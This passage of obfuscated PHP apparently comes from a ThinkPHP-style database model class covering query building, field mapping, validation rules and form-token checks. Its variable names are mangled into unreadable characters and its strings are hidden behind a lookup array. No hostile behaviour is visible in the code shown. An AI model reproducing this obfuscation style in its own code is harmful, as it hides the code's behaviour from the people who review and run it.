elseif (!1 !== strpos($•æó‡è, $âğùŸ„½[365]) || !1 !== strpos($•æó‡è, $âğùŸ„½[366])) { $İÂİ‡Ó³[$È‡İ‹Èä] = floatval($İÂİ‡Ó³[$È‡İ‹Èä]); } elseif (!1 !== strpos($•æó‡è, $âğùŸ„½[367])) { $İÂİ‡Ó³[$È‡İ‹Èä] = (bool) $İÂİ‡Ó³[$È‡İ‹Èä]; } } } public function find($ˆáÏˆñ² = array()) { $ƒÜñü«Ø =& $_SERVER[óÔë„ú]; if (is_numeric($ˆáÏˆñ²) || is_string($ˆáÏˆñ²)) { $úÄÉú›‹[$this->getPk()] = intval($ˆáÏˆñ²); $this->options[$ƒÜñü«Ø[352]] = $úÄÉú›‹; } $this->options[$ƒÜñü«Ø[368]] = 1; $ˆáÏˆñ² = $this->_parseOptions(); $ôïş¥ğÂ = $this->db->select($ˆáÏˆñ²); if (!1 === $ôïş¥ğÂ) { return !1; } if (empty($ôïş¥ğÂ)) { return null; } $this->data = $ôïş¥ğÂ[0]; $this->_afterFind($this->data, $ˆáÏˆñ²); if (!empty($this->options[$ƒÜñü«Ø[369]])) { return $this->returnResult($this->data, $this->options[$ƒÜñü«Ø[369]]); } return $this->data; } protected function _afterFind(&$·ãïçÔó, $ªÙ·ç©) { } protected function returnResult($ÌÕñ—Úü, $õü²³§¿ = '') { $±õıãğ =& $_SERVER[óÔë„ú]; if ($õü²³§¿) { if (is_callable($õü²³§¿)) { return call_user_func($õü²³§¿, $ÌÕñ—Úü); } switch (strtolower($õü²³§¿)) { case $±õıãğ[370]: return json_encode($ÌÕñ—Úü); case $±õıãğ[371]: return xml_encode($ÌÕñ—Úü); } } return $ÌÕñ—Úü; } public function parseFieldsMap($û¸¸¬´®, $ç­áŸŒ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $çŞí®–á => $öœöÛèˆ) { if ($ç­áŸŒ == 1) { if (isset($û¸¸¬´®[$öœöÛèˆ])) { $û¸¸¬´®[$çŞí®–á] = $û¸¸¬´®[$öœöÛèˆ]; unset($û¸¸¬´®[$öœöÛèˆ]); } } else { if (isset($û¸¸¬´®[$çŞí®–á])) { $û¸¸¬´®[$öœöÛèˆ] = $û¸¸¬´®[$çŞí®–á]; unset($û¸¸¬´®[$çŞí®–á]); } } } } return $û¸¸¬´®; } public function setField($í±Å¥æ, $Úä‰Ñä = '') { if (is_array($í±Å¥æ)) { $Ò¬à˜ş« = $í±Å¥æ; } else { $Ò¬à˜ş«[$í±Å¥æ] = $Úä‰Ñä; } return $this->save($Ò¬à˜ş«); } public function setAdd($ĞÂÊİ«ø, $’ïŸ·¾å = 1) { $ûÇ¶ˆ˜÷ =& $_SERVER[óÔë„ú]; $¹§Â À¥ = $ĞÂÊİ«ø . $ûÇ¶ˆ˜÷[372] . $’ïŸ·¾å; if ($’ïŸ·¾å < 0) { $¹§Â À¥ = $ĞÂÊİ«ø . $’ïŸ·¾å; } return $this->setField($ĞÂÊİ«ø, array($ûÇ¶ˆ˜÷[373], $¹§Â À¥)); } public function getField($í’€¿›­, $¬ íÁòÌ = null) { $İ…æÁİÉ =& $_SERVER[óÔë„ú]; $ãƒ€Ç³‘[$İ…æÁİÉ[350]] = $í’€¿›­; $ãƒ€Ç³‘ = $this->_parseOptions($ãƒ€Ç³‘); $í’€¿›­ = trim($í’€¿›­); if (strpos($í’€¿›­, $İ…æÁİÉ[50])) { if (!isset($ãƒ€Ç³‘[$İ…æÁİÉ[368]])) { $ãƒ€Ç³‘[$İ…æÁİÉ[368]] = is_numeric($¬ íÁòÌ) ? $¬ íÁòÌ : $İ…æÁİÉ[12]; } $æ¨™Äá§ = $this->db->select($ãƒ€Ç³‘); if (!empty($æ¨™Äá§)) { $Œ ÄĞ¬  = explode($İ…æÁİÉ[50], $í’€¿›­); $í’€¿›­ = array_keys($æ¨™Äá§[0]); $¸Œú‘Îš = array_shift($í’€¿›­); $ÀÍ’–Å© = array_shift($í’€¿›­); $ÜŒĞÏ‘ê = array(); $Š…ò… ¼ = count($Œ ÄĞ¬ ); foreach ($æ¨™Äá§ as $µ‹Ã‚Ë‘) { $åï£íè = $µ‹Ã‚Ë‘[$¸Œú‘Îš]; if (2 == $Š…ò… ¼) { $ÜŒĞÏ‘ê[$åï£íè] = $µ‹Ã‚Ë‘[$ÀÍ’–Å©]; } else { $ÜŒĞÏ‘ê[$åï£íè] = is_string($¬ íÁòÌ) ? implode($¬ íÁòÌ, $µ‹Ã‚Ë‘) : $µ‹Ã‚Ë‘; } } return $ÜŒĞÏ‘ê; } } else { if (!0 !== $¬ íÁòÌ) { $ãƒ€Ç³‘[$İ…æÁİÉ[368]] = is_numeric($¬ íÁòÌ) ? $¬ íÁòÌ : 1; } if ($¬ íÁòÌ === $İ…æÁİÉ[332]) { unset($ãƒ€Ç³‘[$İ…æÁİÉ[368]]); } $µ‹Ã‚Ë‘ = $this->db->select($ãƒ€Ç³‘); if (!empty($µ‹Ã‚Ë‘)) { if ($¬ íÁòÌ === $İ…æÁİÉ[332]) { return reset($µ‹Ã‚Ë‘[0]); } if (!0 !== $¬ íÁòÌ && 1 == $ãƒ€Ç³‘[$İ…æÁİÉ[368]]) { return reset($µ‹Ã‚Ë‘[0]); } foreach ($µ‹Ã‚Ë‘ as $„×ÏÀºÉ) { $ú½½Ê¤ë[] = $„×ÏÀºÉ[$í’€¿›­]; } return $ú½½Ê¤ë; } } return null; } public function create($š…ÈºÍ¦ = '', $ÔíŞì‘ = '') { $ı„Î†ÙÎ =& $_SERVER[óÔë„ú]; if (empty($š…ÈºÍ¦)) { $š…ÈºÍ¦ = $_POST; } elseif (is_object($š…ÈºÍ¦)) { $š…ÈºÍ¦ = get_object_vars($š…ÈºÍ¦); } if (empty($š…ÈºÍ¦) || !is_array($š…ÈºÍ¦)) { $this->error = think_lang($ı„Î†ÙÎ[348]); return !1; } $š…ÈºÍ¦ = $this->parseFieldsMap($š…ÈºÍ¦, 0); $ÔíŞì‘ = $ÔíŞì‘ ? $ÔíŞì‘ : (!empty($š…ÈºÍ¦[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$ı„Î†ÙÎ[350]])) { $¯âÒƒ¨ = $this->options[$ı„Î†ÙÎ[350]]; unset($this->options[$ı„Î†ÙÎ[350]]); } elseif ($ÔíŞì‘ == THINK_MODEL_INSERT && isset($this->insertFields)) { $¯âÒƒ¨ = $this->insertFields; } elseif ($ÔíŞì‘ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $¯âÒƒ¨ = $this->updateFields; } if (isset($¯âÒƒ¨)) { if (is_string($¯âÒƒ¨)) { $¯âÒƒ¨ = explode($ı„Î†ÙÎ[50], $¯âÒƒ¨); } if (think_config($ı„Î†ÙÎ[374])) { $¯âÒƒ¨[] = think_config($ı„Î†ÙÎ[375]); } foreach ($š…ÈºÍ¦ as $à”ÍÎÁ => $áå·¾ÔØ) { if (!in_array($à”ÍÎÁ, $¯âÒƒ¨)) { unset($š…ÈºÍ¦[$à”ÍÎÁ]); } } } if (!$this->autoValidation($š…ÈºÍ¦, $ÔíŞì‘)) { return !1; } if (!$this->autoCheckToken($š…ÈºÍ¦)) { $this->error = think_lang($ı„Î†ÙÎ[376]); return !1; } if ($this->autoCheckFields) { $¯âÒƒ¨ = $this->getDbFields(); foreach ($š…ÈºÍ¦ as $à”ÍÎÁ => $áå·¾ÔØ) { if (!in_array($à”ÍÎÁ, $¯âÒƒ¨)) { unset($š…ÈºÍ¦[$à”ÍÎÁ]); } elseif (MAGIC_QUOTES_GPC && is_string($áå·¾ÔØ)) { $š…ÈºÍ¦[$à”ÍÎÁ] = stripslashes($áå·¾ÔØ); } } } $this->autoOperation($š…ÈºÍ¦, $ÔíŞì‘); $this->data = $š…ÈºÍ¦; return $š…ÈºÍ¦; } public function autoCheckToken($ÅßÊçØÔ) { $»…ôõá‹ =& $_SERVER[óÔë„ú]; if (isset($this->options[$»…ôõá‹[377]]) && !$this->options[$»…ôõá‹[377]]) { return !0; } if (think_config($»…ôõá‹[374])) { $èùæ¥‰˜ = think_config($»…ôõá‹[375]); if (!isset($ÅßÊçØÔ[$èùæ¥‰˜]) || Session::get($èùæ¥‰˜)) { return !1; } list($¸¿»ª£, $ßÇÅ¨ß) = explode($»…ôõá‹[11], $ÅßÊçØÔ[$èùæ¥‰˜]); if ($ßÇÅ¨ß && Session::get($èùæ¥‰˜ . $»…ôõá‹[10] . $¸¿»ª£) === $ßÇÅ¨ß) { Session::remove($èùæ¥‰˜ . $»…ôõá‹[10] . $¸¿»ª£); return !0; } if (think_config($»…ôõá‹[378])) { Session::remove($èùæ¥‰˜ . $»…ôõá‹[10] . $¸¿»ª£); } return !1; } return !0; } public function regex($ìğ“Õç, $Ùò²À¥ï) { $ê‰èöï =& $_SERVER[óÔë„ú]; $©ÙÇºª = array($ê‰èöï[379] => $ê‰èöï[380], $ê‰èöï[381] => $ê‰èöï[382], $ê‰èöï[383] => $ê‰èöï[384], $ê‰èöï[385] => $ê‰èöï[386], $ê‰èöï[387] => $ê‰èöï[388], $ê‰èöï[389] => $ê‰èöï[390], $ê‰èöï[391] => $ê‰èöï[392], $ê‰èöï[366] => $ê‰èöï[393], $ê‰èöï[394] => $ê‰èöï[395]); if (isset($©ÙÇºª[strtolower($Ùò²À¥ï)])) { $Ùò²À¥ï = $©ÙÇºª[strtolower($Ùò²À¥ï)]; } return preg_match($Ùò²À¥ï, $ìğ“Õç) === 1; } private function autoOperation(&$ôÌÌçø™, $šÚ¦«Œ) { $ÛÇ­ááà =& $_SERVER[óÔë„ú]; if (!empty($this->options[$ÛÇ­ááà[396]])) { $©µÖĞ¯ = $this->options[$ÛÇ­ááà[396]]; unset($this->options[$ÛÇ­ááà[396]]); } elseif (!empty($this->_auto)) { $©µÖĞ¯ = $this->_auto; } if (isset($©µÖĞ¯)) { foreach ($©µÖĞ¯ as $ëèä…Â) { if (empty($ëèä…Â[2])) { $ëèä…Â[2] = THINK_MODEL_INSERT; } if ($šÚ¦«Œ == $ëèä…Â[2] || $ëèä…Â[2] == THINK_MODEL_BOTH) { switch (trim($ëèä…Â[3])) { case $ÛÇ­ááà[397]: case $ÛÇ­ááà[398]: $â„ö“åº = isset($ëèä…Â[4]) ? (array) $ëèä…Â[4] : array(); if (isset($ôÌÌçø™[$ëèä…Â[0]])) { array_unshift($â„ö“åº, $ôÌÌçø™[$ëèä…Â[0]]); } if ($ÛÇ­ááà[397] == $ëèä…Â[3]) { $ôÌÌçø™[$ëèä…Â[0]] = call_user_func_array($ëèä…Â[1], $â„ö“åº); } else { $ôÌÌçø™[$ëèä…Â[0]] = call_user_func_array(array(&$this, $ëèä…Â[1]), $â„ö“åº); } break; case $ÛÇ­ááà[350]: $ôÌÌçø™[$ëèä…Â[0]] = $ôÌÌçø™[$ëèä…Â[1]]; break; case $ÛÇ­ááà[399]: if ($ÛÇ­ááà[12] === $ôÌÌçø™[$ëèä…Â[0]]) { unset($ôÌÌçø™[$ëèä…Â[0]]); } break; case $ÛÇ­ááà[400]: default: $ôÌÌçø™[$ëèä…Â[0]] = $ëèä…Â[1]; } if (!1 === $ôÌÌçø™[$ëèä…Â[0]]) { unset($ôÌÌçø™[$ëèä…Â[0]]); } } } } return $ôÌÌçø™; } protected function autoValidation($ÚÇÈô‹, $›²½ïü•) { $õ—‚°Œ­ =& $_SERVER[óÔë„ú]; if (!empty($this->options[$õ—‚°Œ­[401]])) { $Îí£¹î = $this->options[$õ—‚°Œ­[401]]; unset($this->options[$õ—‚°Œ­[401]]); } elseif (!empty($this->_validate)) { $Îí£¹î = $this->_validate; } if (isset($Îí£¹î)) { if ($this->patchValidate) { $this->error = array(); } foreach ($Îí£¹î as $ÕÅõ„” => $Ì›Å«Á) { if (empty($Ì›Å«Á[5]) || $Ì›Å«Á[5] == THINK_MODEL_BOTH || $Ì›Å«Á[5] == $›²½ïü•) { if (0 == strpos($Ì›Å«Á[2], $õ—‚°Œ­[402]) && strpos($Ì›Å«Á[2], $õ—‚°Œ­[403])) { $Ì›Å«Á[2] = think_lang(substr($Ì›Å«Á[2], 2, -1)); } $Ì›Å«Á[3] = isset($Ì›Å«Á[3]) ? $Ì›Å«Á[3] : THINK_EXISTS_VALIDATE; $Ì›Å«Á[4] = isset($Ì›Å«Á[4]) ? $Ì›Å«Á[4] : $õ—‚°Œ­[404]; switch ($Ì›Å«Á[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ÚÇÈô‹, $Ì›Å«Á)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($õ—‚°Œ­[12] != trim($ÚÇÈô‹[$Ì›Å«Á[0]])) { if (!1 === $this->_validationField($ÚÇÈô‹, $Ì›Å«Á)) { return !1; } } break; default: if (isset($ÚÇÈô‹[$Ì›Å«Á[0]])) { if (!1 === $this->_validationField($ÚÇÈô‹, $Ì›Å«Á)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($ à‘’±, $ì­şÖ‡š) { if (!1 === $this->_validationFieldItem($ à‘’±, $ì­şÖ‡š)) { if ($this->patchValidate) { $this->error[$ì­şÖ‡š[0]] = $ì­şÖ‡š[2]; } else { $this->error = $ì­şÖ‡š[2]; return !1; } } return; } protected function _validationFieldItem($æŠ½ƒ½İ, $Û±¬ Î¡) { $ÏµÚŒè =& $_SERVER[óÔë„ú]; switch (strtolower(trim($Û±¬ Î¡[4]))) { case $ÏµÚŒè[397]: case $ÏµÚŒè[398]: $—–ç›¨ø = isset($Û±¬ Î¡[6]) ? (array) $Û±¬ Î¡[6] : array(); if (is_string($Û±¬ Î¡[0]) && strpos($Û±¬ Î¡[0], $ÏµÚŒè[50])) { $Û±¬ Î¡[0] = explode($ÏµÚŒè[50], $Û±¬ Î¡[0]); } if (is_array($Û±¬ Î¡[0])) { foreach ($Û±¬ Î¡[0] as $ÈèÀ…ªõ) { $³—ËÓå[$ÈèÀ…ªõ] = $æŠ½ƒ½İ[$ÈèÀ…ªõ]; } array_unshift($—–ç›¨ø, $³—ËÓå); } else { array_unshift($—–ç›¨ø, $æŠ½ƒ½İ[$Û±¬ Î¡[0]]); } if ($ÏµÚŒè[397] == $Û±¬ Î¡[4]) { return call_user_func_array($Û±¬ Î¡[1], $—–ç›¨ø); } else { return call_user_func_array(array(&$this, $Û±¬ Î¡[1]), $—–ç›¨ø); } case $ÏµÚŒè[405]: return $æŠ½ƒ½İ[$Û±¬ Î¡[0]] == $æŠ½ƒ½İ[$Û±¬ Î¡[1]]; case $ÏµÚŒè[406]: if (is_string($Û±¬ Î¡[0]) && strpos($Û±¬ Î¡[0], $ÏµÚŒè[50])) { $Û±¬ Î¡[0] = explode($ÏµÚŒè[50], $Û±¬ Î¡[0]); } $À¹É«¬Ò = array(); if (is_array($Û±¬ Î¡[0])) { foreach ($Û±¬ Î¡[0] as $ÈèÀ…ªõ) { $À¹É«¬Ò[$ÈèÀ…ªõ] = $æŠ½ƒ½İ[$ÈèÀ…ªõ]; } } else { $À¹É«¬Ò[$Û±¬ Î¡[0]] = $æŠ½ƒ½İ[$Û±¬ Î¡[0]]; } if (!empty($æŠ½ƒ½İ[$this->getPk()])) { $À¹É«¬Ò[$this->getPk()] = array($ÏµÚŒè[407], $æŠ½ƒ½İ[$this->getPk()]); } if ($this->where($À¹É«¬Ò)->find()) { return !1; } return !0; default: return $this->check($æŠ½ƒ½İ[$Û±¬ Î¡[0]], $Û±¬ Î¡[1], $Û±¬ Î¡[4]); } } public function check($²ıçÈèò, $¬ñµĞ»ã, $úñîÉÛ” = "\162\145\x67\x65\x78") { $½ï¶·Ä =& $_SERVER[óÔë„ú]; $úñîÉÛ” = strtolower(trim($úñîÉÛ”)); switch ($úñîÉÛ”) { case $½ï¶·Ä[7]: case $½ï¶·Ä[408]: $†š úä± = is_array($¬ñµĞ»ã) ? $¬ñµĞ»ã : explode($½ï¶·Ä[50], $¬ñµĞ»ã); return $úñîÉÛ” == $½ï¶·Ä[7] ? in_array($²ıçÈèò, $†š úä±) : !in_array($²ıçÈèò, $†š úä±); case $½ï¶·Ä[409]: case $½ï¶·Ä[410]: if (is_array($¬ñµĞ»ã)) { $¸û¦ÀÃß = $¬ñµĞ»ã[0]; $ €”·ˆ€ = $¬ñµĞ»ã[1]; } else { list($¸û¦ÀÃß, $ €”·ˆ€) = explode($½ï¶·Ä[50], $¬ñµĞ»ã); } return $úñîÉÛ” == $½ï¶·Ä[409] ? $²ıçÈèò >= $¸û¦ÀÃß && $²ıçÈèò <= $ €”·ˆ€ : $²ıçÈèò < $¸û¦ÀÃß || $²ıçÈèò > $ €”·ˆ€; case $½ï¶·Ä[411]: case $½ï¶·Ä[412]: return $úñîÉÛ” == $½ï¶·Ä[411] ? $²ıçÈèò == $¬ñµĞ»ã : $²ıçÈèò != $¬ñµĞ»ã; case $½ï¶·Ä[413]: $ÍÆü¢” = mb_strlen($²ıçÈèò, $½ï¶·Ä[414]); if (strpos($¬ñµĞ»ã, $½ï¶·Ä[50])) { list($¸û¦ÀÃß, $ €”·ˆ€) = explode($½ï¶·Ä[50], $¬ñµĞ»ã); return $ÍÆü¢” >= $¸û¦ÀÃß && $ÍÆü¢” <= $ €”·ˆ€; } else { return $ÍÆü¢” == $¬ñµĞ»ã; } case $½ï¶·Ä[415]: list($ŸËÉ—¢, $ Û´ñ®«) = explode($½ï¶·Ä[50], $¬ñµĞ»ã); if (!is_numeric($ŸËÉ—¢)) { $ŸËÉ—¢ = strtotime($ŸËÉ—¢); } if (!is_numeric($ Û´ñ®«)) { $ Û´ñ®« = strtotime($ Û´ñ®«); } return NOW_TIME >= $ŸËÉ—¢ && NOW_TIME <= $ Û´ñ®«; case $½ï¶·Ä[416]: return in_array(get_client_ip(), explode($½ï¶·Ä[50], $¬ñµĞ»ã)); case $½ï¶·Ä[417]: return !in_array(get_client_ip(), explode($½ï¶·Ä[50], $¬ñµĞ»ã)); case $½ï¶·Ä[404]: default: return $this->regex($²ıçÈèò, $¬ñµĞ»ã); } } public function query($¥ñ•¹Œ, $º€ÑñğÀ = false) { $¡ºÀÓã‘ =& $_SERVER[óÔë„ú]; if (!is_bool($º€ÑñğÀ) && !is_array($º€ÑñğÀ)) { $º€ÑñğÀ = func_get_args(); array_shift($º€ÑñğÀ); } $¥ñ•¹Œ = str_replace(array($¡ºÀÓã‘[262], $¡ºÀÓã‘[418]), $¡ºÀÓã‘[53], $¥ñ•¹Œ); $¥ñ•¹Œ = $this->parseSql($¥ñ•¹Œ, $º€ÑñğÀ); return $this->db->query($¥ñ•¹Œ); } public function execute($éóÆÜ¡›, $ŒÖó‰Ğš = false) { if (!is_bool($ŒÖó‰Ğš) && !is_array($ŒÖó‰Ğš)) { $ŒÖó‰Ğš = func_get_args(); array_shift($ŒÖó‰Ğš); } $éóÆÜ¡› = $this->parseSql($éóÆÜ¡›, $ŒÖó‰Ğš); return $this->db->execute($éóÆÜ¡›); } protected function parseSql($ÅòÊÛ´±, $’ùí€¬×) { $×ÙŞÎöä =& $_SERVER[óÔë„ú]; if (!0 === $’ùí€¬×) { $ûå–£Û‡ = $this->_parseOptions(); $ÅòÊÛ´± = $this->db->parseSql($ÅòÊÛ´±, $ûå–£Û‡); } elseif (is_array($’ùí€¬×)) { $’ùí€¬× = array_map(array($this->db, $×ÙŞÎöä[419]), $’ùí€¬×); $ÅòÊÛ´± = vsprintf($ÅòÊÛ´±, $’ùí€¬×); } else { $ÅòÊÛ´± = strtr($ÅòÊÛ´±, array($×ÙŞÎöä[420] => $this->getTableName(), $×ÙŞÎöä[421] => think_config($×ÙŞÎöä[321]))); } $this->db->setModel($this->name); return $ÅòÊÛ´±; } public function db($§áğ¬Êè = '', $Çüğš®à = '', $•Ä†›üî = array()) { $åÁ¤¬Û =& $_SERVER[óÔë„ú]; if ($åÁ¤¬Û[12] === $§áğ¬Êè && $this->db) { return $this->db; } static $Øİ…Ø¼‹ = array(); static $“ìì¿‰» = array(); if (!isset($“ìì¿‰»[$§áğ¬Êè]) || isset($“ìì¿‰»[$§áğ¬Êè]) && $Çüğš®à && $Øİ…Ø¼‹[$§áğ¬Êè] != $Çüğš®à) { if (!empty($Çüğš®à) && is_string($Çüğš®à) && !1 === strpos($Çüğš®à, $åÁ¤¬Û[8])) { $Çüğš®à = think_config($Çüğš®à); } $§áğ¬Êè = think_guid($Çüğš®à); $“ìì¿‰»[$§áğ¬Êè] = Db::getInstance($Çüğš®à); } elseif (NULL === $Çüğš®à) { $“ìì¿‰»[$§áğ¬Êè]->close(); unset($“ìì¿‰»[$§áğ¬Êè]); return; } if (!empty($•Ä†›üî)) { if (is_string($•Ä†›üî)) { parse_str($•Ä†›üî, $•Ä†›üî); } foreach ($•Ä†›üî as $Åä¤Ø»ğ => $­ãØ­øè) { $this->setProperty($Åä¤Ø»ğ, $­ãØ­øè); } } $Øİ…Ø¼‹[$§áğ¬Êè] = $Çüğš®à; $this->db = $“ìì¿‰»[$§áğ¬Êè]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $‘Õ“ˆƒ– = get_class($this); if ($‘Õ“ˆƒ– == $_SERVER[óÔë„ú][422]) { return $this->name; } $this->name = substr($‘Õ“ˆƒ–, 0, -5); } return $this->name; } public function getTableName() { $«ÒÜõœ© =& $_SERVER[óÔë„ú]; if (empty($this->trueTableName)) { $ğƒü‡ˆç = !empty($this->tablePrefix) ? $this->tablePrefix : $«ÒÜõœ©[12]; if (!empty($this->tableName)) { $ğƒü‡ˆç .= $this->tableName; } else { $ğƒü‡ˆç .= think_parse_name($this->name); } $this->trueTableName = strtolower($ğƒü‡ˆç); } return (!empty($this->dbName) ? $this->dbName . $«ÒÜõœ©[10] : $«ÒÜõœ©[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $Ğ˜¬­³ =& $_SERVER[óÔë„ú]; return isset($this->fields[$Ğ˜¬­³[328]]) ? $this->fields[$Ğ˜¬­³[328]] : $this->pk; } public function getDbFields() { $ï¬¤×Ùç =& $_SERVER[óÔë„ú]; if (isset($this->options[$ï¬¤×Ùç[356]])) { $ÂÃ‡¡Ñ¨ = $this->db->getFields($this->options[$ï¬¤×Ùç[356]]); return $ÂÃ‡¡Ñ¨ ? array_keys($ÂÃ‡¡Ñ¨) : !1; } if ($this->fields) { $ÂÃ‡¡Ñ¨ = $this->fields; unset($ÂÃ‡¡Ñ¨[$ï¬¤×Ùç[327]], $ÂÃ‡¡Ñ¨[$ï¬¤×Ùç[328]], $ÂÃ‡¡Ñ¨[$ï¬¤×Ùç[329]], $ÂÃ‡¡Ñ¨[$ï¬¤×Ùç[326]]); return $ÂÃ‡¡Ñ¨; } return !1; } public function data($üÉ°ÈÅ‘ = '') { $˜«‡ëñ¾ =& $_SERVER[óÔë„ú]; if ($˜«‡ëñ¾[12] === $üÉ°ÈÅ‘ && !empty($this->data)) { return $this->data; } if (is_object($üÉ°ÈÅ‘)) { $üÉ°ÈÅ‘ = get_object_vars($üÉ°ÈÅ‘); } elseif (is_string($üÉ°ÈÅ‘)) { parse_str($üÉ°ÈÅ‘, $üÉ°ÈÅ‘); } elseif (!is_array($üÉ°ÈÅ‘)) { think_exception(think_lang($˜«‡ëñ¾[348])); } $this->data = $üÉ°ÈÅ‘; return $this; } public function join($¥ÚÃºôä) { $ß–šºÏà =& $_SERVER[óÔë„ú]; if (is_array($¥ÚÃºôä)) { $this->options[$ß–šºÏà[359]] = $¥ÚÃºôä; } elseif (!empty($¥ÚÃºôä)) { $this->options[$ß–šºÏà[359]][] = $¥ÚÃºôä; } return $this; } public function union($Ûº÷ø¸’, $€ƒâ¤ó¸ = false) { $’ˆ‘Ú· =& $_SERVER[óÔë„ú]; if (empty($Ûº÷ø¸’)) { return $this; } if ($€ƒâ¤ó¸) { $this->options[$’ˆ‘Ú·[423]][$’ˆ‘Ú·[424]] = !0; } if (is_object($Ûº÷ø¸’)) { $Ûº÷ø¸’ = get_object_vars($Ûº÷ø¸’); } if (is_string($Ûº÷ø¸’)) { $›†É‘Ş¯ = $Ûº÷ø¸’; } elseif (is_array($Ûº÷ø¸’)) { if (isset($Ûº÷ø¸’[0])) { $this->options[$’ˆ‘Ú·[423]] = array_merge($this->options[$’ˆ‘Ú·[423]], $Ûº÷ø¸’); return $this; } else { $›†É‘Ş¯ = $Ûº÷ø¸’; } } else { think_exception(think_lang($’ˆ‘Ú·[348])); } $this->options[$’ˆ‘Ú·[423]][] = $›†É‘Ş¯; return $this; } public function cache($Ü¡•Äü¡ = true, $öîœ÷Ê = null, $İàÕî¼ = '') { $¤Óƒ×­¬ =& $_SERVER[óÔë„ú]; if (!1 !== $Ü¡•Äü¡) { $this->options[$¤Óƒ×­¬[425]] = array($¤Óƒ×­¬[97] => $Ü¡•Äü¡, $¤Óƒ×­¬[415] => $öîœ÷Ê, $¤Óƒ×­¬[33] => $İàÕî¼); } return $this; } public function field($Ğú²ğ¸Í, $¾íğÙÍƒ = false) { $ıÂÌ¿å  =& $_SERVER[óÔë„ú]; if (!0 === $Ğú²ğ¸Í) { $Û­â¼£÷ = $this->getDbFields(); $Ğú²ğ¸Í = $Û­â¼£÷ ? $Û­â¼£÷ : $ıÂÌ¿å [220]; } elseif ($¾íğÙÍƒ) { if (is_string($Ğú²ğ¸Í)) { $Ğú²ğ¸Í = explode($ıÂÌ¿å [50], $Ğú²ğ¸Í); } $Û­â¼£÷ = $this->getDbFields(); $Ğú²ğ¸Í = $Û­â¼£÷ ? array_diff($Û­â¼£÷, $Ğú²ğ¸Í) : $Ğú²ğ¸Í; } $this->options[$ıÂÌ¿å [350]] = $Ğú²ğ¸Í; return $this; } public function scope($‘äˆ©¡ = '', $é«†§÷ = NULL) { $ğéê›ç° =& $_SERVER[óÔë„ú]; if ($ğéê›ç°[12] === $‘äˆ©¡) { if (isset($this->_scope[$ğéê›ç°[37]])) { $Õíò¤è˜ = $this->_scope[$ğéê›ç°[37]]; } else { return $this; } } elseif (is_string($‘äˆ©¡)) { $€ ªó¡Æ = explode($ğéê›ç°[50], $‘äˆ©¡); $Õíò¤è˜ = array(); foreach ($€ ªó¡Æ as $¢îˆ¢ïµ) { if (!isset($this->_scope[$¢îˆ¢ïµ])) { continue; } $Õíò¤è˜ = array_merge($Õíò¤è˜, $this->_scope[$¢îˆ¢ïµ]); } if (!empty($é«†§÷) && is_array($é«†§÷)) { $Õíò¤è˜ = array_merge($Õíò¤è˜, $é«†§÷); } } elseif (is_array($‘äˆ©¡)) { $Õíò¤è˜ = $‘äˆ©¡; } if (is_array($Õíò¤è˜) && !empty($Õíò¤è˜)) { $this->options = array_merge($this->options, array_change_key_case($Õíò¤è˜)); } return $this; } public function where($£¦ÚŞÚã, $†óÚ…é§ = null) { $šñìÓıÀ =& $_SERVER[óÔë„ú]; if (!is_null($†óÚ…é§) && is_string($£¦ÚŞÚã)) { if (!is_array($†óÚ…é§)) { $†óÚ…é§ = func_get_args(); array_shift($†óÚ…é§); } $†óÚ…é§ = array_map(array($this->db, $šñìÓıÀ[419]), $†óÚ…é§); $£¦ÚŞÚã = vsprintf($£¦ÚŞÚã, $†óÚ…é§); } elseif (is_object($£¦ÚŞÚã)) { $£¦ÚŞÚã = get_object_vars($£¦ÚŞÚã); } elseif (is_array($£¦ÚŞÚã)) { foreach ($£¦ÚŞÚã as $üï§Ÿâ× => $…õ»£µ£) { if ((is_numeric($üï§Ÿâ×) || !$üï§Ÿâ×) && is_string($…õ»£µ£)) { if (strpos($…õ»£µ£, $šñìÓıÀ[426]) === 0) { continue; } think_trace($šñìÓıÀ[427], $šñìÓıÀ[12], $šñìÓıÀ[49]); die; } } } if (is_string($£¦ÚŞÚã) && $šñìÓıÀ[12] != $£¦ÚŞÚã) { $ÌêˆÖ˜é = array(); $ÌêˆÖ˜é[$šñìÓıÀ[428]] = $£¦ÚŞÚã; $£¦ÚŞÚã = $ÌêˆÖ˜é; } if (isset($this->options[$šñìÓıÀ[352]])) { $this->options[$šñìÓıÀ[352]] = array_merge($this->options[$šñìÓıÀ[352]], $£¦ÚŞÚã); } else { $this->options[$šñìÓıÀ[352]] = $£¦ÚŞÚã; } return $this; } public function limit($Øñšˆ”Æ, $ÑÀ†ıŒİ = null) { $¬óŒÉÅ =& $_SERVER[óÔë„ú]; $this->options[$¬óŒÉÅ[368]] = is_null($ÑÀ†ıŒİ) ? $Øñšˆ”Æ : $Øñšˆ”Æ . $¬óŒÉÅ[50] . $ÑÀ†ıŒİ; return $this; } public function page($…Ø´…Œá, $ÃÍúä× = null) { $ ‘¥¼Ãû =& $_SERVER[óÔë„ú]; $this->options[$ ‘¥¼Ãû[429]] = is_null($ÃÍúä×) ? $…Ø´…Œá : $…Ø´…Œá . $ ‘¥¼Ãû[50] . $ÃÍúä×; return $this; } public function comment($¼Ã¡ò¹³) { $this->options[$_SERVER[óÔë„ú][430]] = $¼Ã¡ò¹³; return $this; } public function setProperty($ÛÜ®¢¹¬, $¯·õÎ‰Ğ) { if (property_exists($this, $ÛÜ®¢¹¬)) { $this->{$ÛÜ®¢¹¬} = $¯·õÎ‰Ğ; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\144\151\146\x79\x54\151\x6d\145", "\x74\151\x6d\145", "\x69\156\x73\145\162\164\54\165\160\144\141\164\x65", 